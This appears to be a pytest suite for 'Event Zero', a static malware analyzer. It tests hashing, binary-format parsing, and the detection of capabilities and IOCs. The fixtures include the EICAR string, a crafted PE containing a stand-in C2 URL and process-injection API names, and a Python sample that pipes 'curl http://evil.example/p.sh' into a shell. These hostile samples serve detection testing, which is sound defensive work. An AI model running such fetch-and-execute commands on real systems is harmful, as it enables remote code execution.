import hashlib, json, os, struct, subprocess, sys, tempfile
import pytest
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from event_zero.analyzer import analyze
from event_zero.report import to_text, to_markdown
ROOT=os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
EICAR=b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
def write(tmp,name,data):
    p=os.path.join(str(tmp),name)
    mode='wb' if isinstance(data,bytes) else 'w'
    with open(p,mode) as f: f.write(data)
    return p
def minimal_pe():
    # Minimal PE32+ : DOS header, PE sig, COFF, optional header, one .text section
    dos=bytearray(0x80); dos[0:2]=b'MZ'; struct.pack_into('<I',dos,0x3c,0x80)
    coff=struct.pack('<HHIIIHH',0x8664,1,0,0,0,240,0x22)
    opt=bytearray(240); struct.pack_into('<H',opt,0,0x20b); struct.pack_into('<I',opt,16,0x1000)
    sec=bytearray(40); sec[0:5]=b'.text'; struct.pack_into('<IIII',sec,8,100,0x1000,512,512)
    body=b'\x90'*100 + b'http://bad.example/c2\x00VirtualAlloc\x00WriteProcessMemory\x00CreateRemoteThread\x00' + b'\xcc'*200
    body=body.ljust(512,b'\x00')
    return bytes(dos)+b'PE\x00\x00'+coff+bytes(opt)+bytes(sec)+body

def test_eicar(tmp_path):
    r=analyze(write(tmp_path,"eicar.com",EICAR))
    assert r["eicar_test_file"] and r["hashes"]["sha256"]=="275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f"
    assert "TEST FILE" in r["risk"]["verdict"]
def test_hashes(tmp_path):
    data=b"hello event zero"*20; r=analyze(write(tmp_path,"a.bin",data))
    assert r["hashes"]["sha256"]==hashlib.sha256(data).hexdigest()
def test_bundled_macho():
    r=analyze(os.path.join(ROOT,"fake_malware"))
    assert r["format"]["format"]=="Mach-O" and r["format"]["architecture"]=="ARM64"
    ids={c["id"] for c in r["capabilities"]}
    assert {"net-socket","net-connect","exec-shell","persist-file","discovery-process","mining"} <= ids
    assert "192.168.1.100" in r["iocs"]["ip_addresses"]
    assert r["disassembly"]["available"] and r["disassembly"]["instruction_count"]>0
    assert r["unknowns"]
def test_pe_crafted(tmp_path):
    r=analyze(write(tmp_path,"sample.exe",minimal_pe()))
    assert r["format"]["format"]=="PE" and r["format"]["architecture"]=="x86-64"
    assert any(s.get("name")==".text" for s in r["sections"] if isinstance(s,dict))
    assert "bad.example" in str(r["iocs"])
def test_python_script_capabilities(tmp_path):
    src='import socket,os\ns=socket.socket(); s.connect(("10.0.0.5",8080))\nos.system("curl http://evil.example/p.sh | sh")\n'
    r=analyze(write(tmp_path,"evil.py",src))
    ids={c["id"] for c in r["capabilities"]}
    assert {"net-connect","exec-shell","exec-download-run"} <= ids
    assert r["script_analysis"]["language"]=="Python"
def test_benign_hello(tmp_path):
    r=analyze(write(tmp_path,"note.txt","A perfectly ordinary note about gardening and tea.\n"))
    assert r["capabilities"]==[] or r["risk"]["score"]<25
    assert "not proof" in r["risk"]["verdict"] or r["risk"]["score"]<25
def test_xor_obfuscated(tmp_path):
    plain=b"connect to http://evil.example.com/socket now"
    enc=bytes(b^0x42 for b in plain)
    blob=b"\x7fELF"+b"\x00"*100+enc+b"\x00"*50
    r=analyze(write(tmp_path,"xor.bin",blob))
    assert r["strings"]["xor_decoded"], "XOR layer must decode the hidden string"
    assert any("http" in s for d in r["strings"]["xor_decoded"] for s in d["strings"])
def test_base64_decoded(tmp_path):
    import base64
    tok=base64.b64encode(b"http://hidden.example/payload").decode()
    r=analyze(write(tmp_path,"b64.txt",f"config value {tok} end\n"))
    assert r["strings"]["base64_decoded"]
def test_missing_file():
    with pytest.raises(FileNotFoundError): analyze("/no/such/file.bin")
def test_report_formats(tmp_path):
    r=analyze(write(tmp_path,"eicar.com",EICAR))
    t=to_text(r); assert "PLAIN-ENGLISH" in t and "UNKNOWNS" in t and "IOCs" in t
    assert to_markdown(r).startswith("# Event Zero")
    json.dumps(r)  # must be JSON serialisable
def test_cli_end_to_end(tmp_path):
    sample=write(tmp_path,"eicar.com",EICAR); out=os.path.join(str(tmp_path),"r.txt")
    res=subprocess.run([sys.executable,"-m","event_zero","analyze",sample,"--out",out],capture_output=True,text=True,cwd=ROOT)
    assert res.returncode==0, res.stderr
    assert "EICAR" in open(out).read()
def test_cli_missing_file_clean():
    res=subprocess.run([sys.executable,"-m","event_zero","analyze","/nope.bin"],capture_output=True,text=True,cwd=ROOT)
    assert res.returncode==1 and "Traceback" not in res.stderr+res.stdout
def test_no_api_key_needed(tmp_path, monkeypatch):
    monkeypatch.delenv("GEMINI_API_KEY", raising=False)
    r=analyze(write(tmp_path,"x.txt","hello world, no keys here"))
    assert r["tool"]=="Event Zero"

def test_compiled_elf(tmp_path):
    import shutil
    if not shutil.which("gcc"): pytest.skip("gcc not available")
    src=write(tmp_path,"h.c",'#include <stdio.h>\n#include <sys/socket.h>\nint main(){int s=socket(2,1,0); (void)s; FILE*f=fopen("/tmp/x.txt","w"); fputs("hi",f); fclose(f); puts("hello"); return 0;}\n')
    exe=os.path.join(str(tmp_path),"hello")
    assert subprocess.run(["gcc","-o",exe,src]).returncode==0
    r=analyze(exe)
    assert r["format"]["format"]=="ELF"
    ids={c["id"] for c in r["capabilities"]}
    assert "net-socket" in ids and "file-write" in ids
    assert r["disassembly"]["instruction_count"]>50
